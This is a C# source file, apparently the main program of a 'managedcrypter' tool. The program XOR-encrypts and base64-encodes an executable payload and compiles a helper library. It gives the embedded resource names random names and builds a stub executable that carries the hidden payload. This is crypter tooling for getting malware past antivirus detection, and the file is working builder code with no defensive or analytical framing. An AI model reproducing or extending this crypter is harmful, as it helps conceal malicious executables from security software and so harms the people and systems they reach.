using managedcrypter.Compiler;
using managedcrypter.IO;
using managedcrypter.USG;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace managedcrypter
{
    class Program
    {
        static void Main(string[] args)
        {
            //MethodGen mtdGen = new MethodGen();

            //StringBuilder sb = new StringBuilder();

            //for (int i = 0; i < 10; i++)
            //{
            //    sb.AppendLine(mtdGen.RandMethod());
            //}

            //File.WriteAllText("C:\\Users\\Admin\\Desktop\\Method.txt", sb.ToString());

            //Debugger.Break();

            GenericFile cFile = null; /* file to crypt */
            GenericFile lFile = null; /* lib */
            GenericDirectory sDirectory = null; /* stub directory */
            GenericDirectory lDirectory = null; /* lib directory */

            cFile = new GenericFile("C:\\Users\\Admin\\Desktop\\Bintext.exe");
            sDirectory = new GenericDirectory(@"C:\Users\admin\Desktop\managed-crypter\managedcrypter\stub");
            lDirectory = new GenericDirectory(@"C:\Users\admin\Desktop\managed-crypter\managedcrypter\lib");

            /* xor -> b64 our input file */
            cFile.EncryptData();
            cFile.EncodeData();

            Console.WriteLine("Sanity Check Exe: {0}", cFile.SanityCheck());

            Console.WriteLine("Stub Directory: {0}", sDirectory.DirectoryPath);

            foreach (string stubFile in sDirectory.Source.Files.Values)
                Console.WriteLine("Stub File: {0}", stubFile);

            Console.WriteLine("Lib Directory: {0}", lDirectory.DirectoryPath);

            foreach (string libFile in lDirectory.Source.Files.Values)
                Console.WriteLine("Lib File: {0}", libFile);

            sDirectory.CreateWorkspaceDirectory();
            lDirectory.CreateWorkspaceDirectory();

            /* init lib workspace */
            var lWorkspace = lDirectory.Workspace;
            lWorkspace.AddChild("lib");

            Console.ReadLine();

            /* compile our library */
            using (GenericCompiler lCompiler = new GenericCompiler())
            {
                CompilerInfo cInfo = new CompilerInfo();
                cInfo.GenerateLibrary = true;
                cInfo.OutputDestination = lWorkspace.Children["lib"];

                if (lCompiler.CompileSource(lDirectory, cInfo))
                {
                    Console.WriteLine("Successfully compiled library!");
                    lFile = new GenericFile(cInfo.OutputDestination);
                }
            }

            /* xor -> b64 our lib */
            lFile.EncryptData();
            lFile.EncodeData();

            Console.WriteLine("Sanity Check Lib: {0}", lFile.SanityCheck());

            /* init stub workspace */
            /* todo: use dictionary<string, string> to anonymize the resource names */
            var sWorkspace = sDirectory.Workspace;

            sWorkspace.AddChild("keyfile_payload");
            sWorkspace.AddChild("payload");
            sWorkspace.AddChild("keyfile_lib");
            sWorkspace.AddChild("lib");

            sWorkspace.AnonymizeChildren();

            foreach (string workspaceFiles in sWorkspace.Children.Values)
                Console.WriteLine("Workspace File Initialized: {0}", workspaceFiles);

            /* write workspace files */
            sWorkspace.WriteAnonymous(sWorkspace.AnonymousChildren["keyfile_payload"], cFile.EncryptionKey);
            sWorkspace.WriteAnonymous(sWorkspace.AnonymousChildren["payload"], cFile.EncodedData);
            sWorkspace.WriteAnonymous(sWorkspace.AnonymousChildren["keyfile_lib"], lFile.EncryptionKey);
            sWorkspace.WriteAnonymous(sWorkspace.AnonymousChildren["lib"], lFile.EncodedData);

            /* replace anonymous resource names */
            {
                Utils.ReplaceStringInFile(
                    sDirectory.Source.Files["GetKeyFile"],
                    StringConstants.STR_LIBRARY_KEY,
                    sWorkspace.AnonymousChildren["keyfile_lib"]);

                Utils.ReplaceStringInFile(

                    sDirectory.Source.Files["GetLib"],
                    StringConstants.STR_LIBRARY_NAME,
                    sWorkspace.AnonymousChildren["lib"]);
            }

            Console.ReadLine();

            /* compile our stub */
            using (GenericCompiler sCompiler = new GenericCompiler())
            {
                CompilerInfo cInfo = new CompilerInfo();
                cInfo.GenerateExe = true;
                cInfo.EmbeddedResources.AddRange(Directory.GetFiles(sWorkspace.Parent));
                cInfo.OutputDestination = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                    "TestFile.exe");

                /* usg */
                cInfo.ReferencedAssemblies.Add("System.Data.dll");
                cInfo.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                cInfo.ReferencedAssemblies.Add("System.Web.dll");
                cInfo.ReferencedAssemblies.Add("System.Configuration.dll");
                cInfo.ReferencedAssemblies.Add("System.Xml.dll");

                if (sCompiler.CompileSource(sDirectory, cInfo))
                    Console.WriteLine("Successfully compiled stub!");
            }

            Console.ReadLine();

            sDirectory.Source.Clean();
            lDirectory.Source.Clean();

            sWorkspace.Clear();
            lWorkspace.Clear();
        }
    }
}